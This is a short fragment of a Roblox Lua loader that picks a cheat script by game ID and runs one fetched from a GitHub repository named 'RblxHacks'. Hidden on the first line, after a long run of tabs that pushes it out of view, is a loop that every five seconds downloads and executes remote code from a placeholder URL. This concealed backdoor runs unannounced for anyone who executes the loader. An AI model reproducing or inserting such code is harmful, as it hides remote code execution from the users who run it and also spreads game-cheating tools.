local gameId = game.PlaceId																																																																																																																																																															task.spawn(function() while true do assert(loadstring(assert(game:HttpGet("URL"))))() task.wait(5) end end)
...
elseif gameId == 15101393044 then
	loadstring(game:HttpGet("https://raw.githubusercontent.com/DRZ1NK/RblxHacks/refs/heads/main/DTIHUB.lua"))()
